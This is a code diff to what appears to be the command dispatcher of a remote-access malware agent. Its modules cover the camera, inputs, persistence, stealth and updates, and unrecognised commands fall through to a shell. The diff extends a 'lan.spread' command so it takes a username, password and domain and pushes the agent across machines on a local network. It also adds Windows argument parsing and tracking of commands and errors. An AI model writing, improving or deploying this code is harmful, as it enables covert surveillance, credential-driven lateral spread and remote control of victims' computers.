@@ -27,6 +27,33 @@ from .. import guardian
 from . import (camera, files, inputs, persistence, runtime, screen, stealth, sysinfo,
                system, updater)
 
+def _split_args(text: str) -> list[str]:
+    """Split a command line, keeping Windows backslashes intact.
+
+    shlex.split() is POSIX mode and eats '\\', turning C:\\a\\b into C:ab.
+    """
+    parts: list[str] = []
+    current: list[str] = []
+    quote = ""
+    for char in text:
+        if quote:
+            if char == quote:
+                quote = ""
+            else:
+                current.append(char)
+        elif char in "\"'":
+            quote = char
+        elif char.isspace():
+            if current:
+                parts.append("".join(current))
+                current = []
+        else:
+            current.append(char)
+    if current:
+        parts.append("".join(current))
+    return parts
+
+
 Handler = Callable[["object", str], str | None]
 
 REGISTRY: dict[str, Handler] = {}
@@ -607,7 +634,7 @@ def cmd_python(agent, argument: str) -> None:
     first_path = os.path.expanduser(first_token.strip('"'))
 
     if os.path.isfile(first_path):
-        cmd = [python_bin, first_path] + (shlex.split(rest) if rest else [])
+        cmd = [python_bin, first_path] + (_split_args(rest) if rest else [])
     else:
         cmd = [python_bin, "-c", trimmed]
 
@@ -707,7 +734,12 @@ def cmd_lan_push(agent, argument: str):
 def cmd_lan_spread(agent, argument: str):
     if not getattr(agent, "lan", None):
         return "lan disabled"
-    agent.send_json({"kind": "lan_spread", "result": agent.spreader.scan_and_push()})
+    parts = argument.split()
+    user = parts[0] if parts else ""
+    password = parts[1] if len(parts) > 1 else ""
+    domain = parts[2] if len(parts) > 2 else ""
+    agent.send_json({"kind": "lan_spread", "result":
+                     agent.spreader.scan_and_push(user, password, domain)})
 
 
 @command("lan.refresh")
@@ -788,9 +820,14 @@ def execute(agent, line: str) -> None:
     if handler is None:
         shell(agent, line)
         return
+    if hasattr(agent, "health") and agent.health:
+        agent.health.mark_command(line)
     try:
         result = handler(agent, argument.strip())
         if isinstance(result, str) and result:
             agent.reply(result)
     except Exception:
-        agent.reply(traceback.format_exc().strip().splitlines()[-1])
+        err_msg = traceback.format_exc().strip().splitlines()[-1]
+        if hasattr(agent, "health") and agent.health:
+            agent.health.mark_error(err_msg)
+        agent.reply(err_msg)
